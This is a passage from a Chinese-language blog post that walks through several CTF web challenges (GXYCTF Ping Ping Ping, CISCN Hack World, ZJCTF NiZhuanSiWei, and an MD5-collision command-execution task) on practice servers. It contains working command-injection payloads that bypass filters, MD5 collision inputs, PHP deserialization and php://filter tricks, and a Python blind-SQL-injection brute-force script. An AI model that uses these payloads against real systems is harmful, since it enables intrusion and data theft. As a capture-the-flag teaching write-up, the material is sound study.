class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意这行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br></pre></td></tr></table></figure>

<h4 id="使md5相等但是字符串不等，这里使用md5强绕过"><a href="#使md5相等但是字符串不等，这里使用md5强绕过" class="headerlink" title="使md5相等但是字符串不等，这里使用md5强绕过"></a>使md5相等但是字符串不等，这里使用md5强绕过</h4><h6 id="1-常规的0e绕过，"><a href="#1-常规的0e绕过，" class="headerlink" title="1.常规的0e绕过，"></a>1.常规的0e绕过，</h6><p>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p>
<ul>
<li><p>QNKCDZO</p>
</li>
<li><p>240610708</p>
</li>
<li><p>s878926199a</p>
</li>
<li><p>s155964671a</p>
</li>
<li><p>s214587387a</p>
</li>
<li><p>s214587387a</p>
</li>
<li><h5 id="0e215962017-的-MD5-值也是由-0e-开头，在-PHP-弱类型比较中相等"><a href="#0e215962017-的-MD5-值也是由-0e-开头，在-PHP-弱类型比较中相等" class="headerlink" title="0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等"></a>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</h5></li>
</ul>
<h6 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2. 数组绕过"></a>2. 数组绕过</h6><p>如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br></pre></td></tr></table></figure>

<p>传入，判断为真</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;a&amp;b[]&#x3D;b</span><br></pre></td></tr></table></figure>

<h6 id="3-强类型绕过"><a href="#3-强类型绕过" class="headerlink" title="3. 强类型绕过"></a>3. 强类型绕过</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br></pre></td></tr></table></figure>

<p>进行url解码后ab的md5值相等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Param1&#x3D;&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2&#x3D;&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br></pre></td></tr></table></figure>

<p>ok，我们继续构造payload，用burp抓包，并加上 Content-Type: application/x-www-form-urlencoded先需要urldecode</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/7.png" class></div>

<p>接下来绕过正则表达式</p>
<p><code>|\\|\\\\|</code>，因为正则中<code>\\\</code>才匹配到一个真正意义上的反斜杠<code>\</code>字符，所以反斜杠未被过滤，可以用/bin/c\at /flag来绕过，找到flag</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/8.png" class></div>

<p>hexo g -d</p>
<p>?file=php://filter/convert.base64-encode/resource=flag.php</p>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/10.png" class></div>

<h6 id="shell-过滤空格"><a href="#shell-过滤空格" class="headerlink" title="shell 过滤空格"></a>shell 过滤空格</h6><p>系统自带的变量 $IFS 内部字段分隔符(Internal Field Separator, IFS)定义一个定界符，默认是空格。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span class="variable">$1flag</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$1flag</span></span></span><br><span class="line">cat&lt;flag</span><br><span class="line"><span class="meta">cat%</span><span class="bash">09flag //php</span></span><br></pre></td></tr></table></figure>

<p>构造payload—/?ip=127.0.0.1;cat$IFS$1index.php，获得下述代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PING <span class="number">127.0</span><span class="number">.0</span><span class="number">.7</span> (<span class="number">127.0</span><span class="number">.0</span><span class="number">.7</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则表达式，是判断整个字符串内下面是否按顺序出现过flag四个字母</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip)</span><br><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;a=f;cat$IFS$<span class="number">1</span>$alag.php    <span class="comment">//过滤</span></span><br><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;a=g;cat$IFS$<span class="number">1</span>fla$a.php	<span class="comment">//直接获得flag，因为源码中有一个$a变量可以覆盖</span></span><br><span class="line">    </span><br><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh <span class="comment">//直接获得flag</span></span><br><span class="line"><span class="comment">//Y2F0IGZsYWcucGhw是cat flag.php的base64-encode</span></span><br><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;cat$IFS$<span class="number">1</span>`ls` <span class="comment">//方法名叫内联执行,方法:将反引号内命令的输出作为输入执行,获取全部信息</span></span><br></pre></td></tr></table></figure>

<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/9.png" class></div>

<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/11.png" class></div>

<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/12.png" class></div>

<p>看到应该是sql注入，题目已经给出了table与column，跑一下自己的sql过滤字典发现一些被过滤(482)</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/13.png" class></div>

<p>看到空格被过滤但是括号、select等没有被过滤，直接构造完成bool sql注入</p>
<p>id=1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</p>
<p>if(1,2,3) 1是条件 ,若条件为真,则执行2;是若条件为假,则执行</p>
<p>substr(string,int a,int b)<br>    1、string 需要截取的字符串<br>    2、a 截取字符串的开始位置（注：当a等于0或1时，都是从第一位开始截取）<br>    3、b 要截取的字符串的长度</p>
<p>burp抓包发现如果正确则返回Hello, glzjin wants a girlfriend.，如果是错误则返回Error Occured When Fetch Result.根据写爆破代码，二分查找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://c3662bc6-5676-4a07-898e-8c9e54927886.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(x,mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    time.sleep(<span class="number">1</span>) <span class="comment">#过快来不及回应</span></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>得到flag—flag{942a10bb-4d59-4d27-8246-746862abd4b2}</p>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>text=<a href="https://www.link-studio.cn/2.txt放&quot;welcome" target="_blank" rel="noopener">https://www.link-studio.cn/2.txt放&quot;welcome</a> to the zjctf”</p>
<p>file = php://filter/read=convert.base64-encode/resource=useless.php得到内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="toString-是魔术方法的一种-当一个对象被当作字符串对待的时候，会触发这个魔术方法"><a href="#toString-是魔术方法的一种-当一个对象被当作字符串对待的时候，会触发这个魔术方法" class="headerlink" title="__toString() 是魔术方法的一种,当一个对象被当作字符串对待的时候，会触发这个魔术方法"></a>__toString() 是魔术方法的一种,当一个对象被当作字符串对待的时候，会触发这个魔术方法</h5><p>构造payload—</p>
<p>/?text=<a href="https://www.link-studio.cn/2.txt&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}" target="_blank" rel="noopener">https://www.link-studio.cn/2.txt&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
<p>得到flag</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/14.png" class></div>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://zmh2000829.github.io/2020/10/18/ctf-web9/" data-id="ckgdqstj90000sgvb7am83bpo" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/" rel="tag">一些比赛题目</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/11/16/ctfer-from-0-to-1/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          ctfer_from_0_to_1
        
      </div>
    </a>
  
  
    <a href="/2020/10/04/ctf-web8/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">XXE漏洞介绍</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/" rel="tag">一些比赛题目</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">一些比赛题目</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/16/ctfer-from-0-to-1/">ctfer_from_0_to_1</a>
          </li>
        
          <li>
            <a href="/2020/10/18/ctf-web9/">web比赛题目，最新更新11/9/2020</a>
          </li>
        
          <li>
            <a href="/2020/10/04/ctf-web8/">XXE漏洞介绍</a>
          </li>
        
          <li>
            <a href="/2020/09/27/ctf-web7/">sqli-labs专题持续更新</a>
          </li>
        
          <li>
            <a href="/2020/09/23/ctf-web6/">ctf-web newbugku专题持续更新</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>